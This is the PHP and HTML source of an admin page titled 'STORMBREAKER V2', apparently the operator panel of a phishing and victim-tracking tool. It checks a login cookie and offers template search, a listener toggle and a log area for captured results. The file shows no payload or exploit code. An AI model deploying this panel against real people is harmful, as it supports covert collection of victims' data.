<?php
session_start();
include "./assets/components/login-arc.php";


if (isset($_COOKIE['logindata']) && $_COOKIE['logindata'] == $key['token'] && $key['expired'] == "no") {
    if (!isset($_SESSION['IAm-logined'])) {
        $_SESSION['IAm-logined'] = 'yes';
    }
} elseif (isset($_SESSION['IAm-logined'])) {
    $client_token = generate_token();
    setcookie("logindata", $client_token, time() + (86400 * 30), "/"); // 86400 = 1 day
    change_token($client_token);
} else {
    header('location: login.php');
}
?>


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="./assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="./assets/css/light-theme.min.css" rel="stylesheet">
    <title>PANEL ADMIN</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');

    :root {
        --primary-color: #4f46e5;
        --secondary-color: #f9fafb;
        --accent-color: #e5e7eb;
    }

    body {
        font-family: 'Inter', sans-serif;
        background-color: #f3f4f6;
        color: #111827;
    }

    .file-item:hover {
        transform: translateY(-2px);
        box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
    }

    .file-icon {
        transition: all 0.2s ease;
    }

    .file-item:hover .file-icon {
        transform: scale(1.1);
    }

    .search-input:focus {
        box-shadow: 0 0 0 2px rgba(79, 70, 229, 0.5);
    }

    .loading-spinner {
        animation: spin 1s linear infinite;
    }

    @keyframes spin {
        from {
            transform: rotate(0deg);
        }

        to {
            transform: rotate(360deg);
        }
    }
    </style>
</head>

<body class="min-h-screen">
    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">



        <div class="bg-white rounded-xl shadow-md overflow-hidden">
            <div class="text-center mb-12">
                <h1 class="text-4xl font-bold text-gray-900 mb-3">PANEL ADMIN</h1>
                <p class="text-xl text-gray-600 max-w-3xl mx-auto">STORMBREAKER V2</p>

                <div class="mt-8 max-w-md mx-auto relative">
                    <input type="text" id="searchInput" placeholder="Search templates..."
                        class="w-full px-5 py-3 rounded-lg border border-gray-300 focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-transparent transition-all duration-200">
                    <svg class="absolute right-3 top-3.5 h-5 w-5 text-gray-400" fill="none" viewBox="0 0 24 24"
                        stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                    </svg>
                </div>
            </div>
            <div id="links"></div>





            <div class="mt-2 d-flex justify-content-center">
                <textarea class="form-control w-50 m-3" placeholder="result ..." id="result" rows="25"></textarea>
            </div>

            <div class="mt-2 d-flex justify-content-center">
                <button class="btn btn-danger m-2" id="btn-listen">Listener Runing / press to stop</button>
                <button class="btn btn-success m-2" id="btn-listen"
                    onclick=saveTextAsFile(result.value,'log.txt')>Download Logs</button>
                <button class="btn btn-warning m-2" id="btn-clear">Clear Logs</button>
            </div>
        </div>
    </div>
    </div>

    <div class="mt-8 text-center text-sm text-gray-500">
        <p>@ayk.ll</p>
    </div>
    </div>



</body>

</html>

<script src="./assets/js/jquery.min.js"></script>
<script src="./assets/js/script.js"></script>
<script src="./assets/js/sweetalert2.min.js"></script>
<script src="./assets/js/growl-notification.min.js"></script>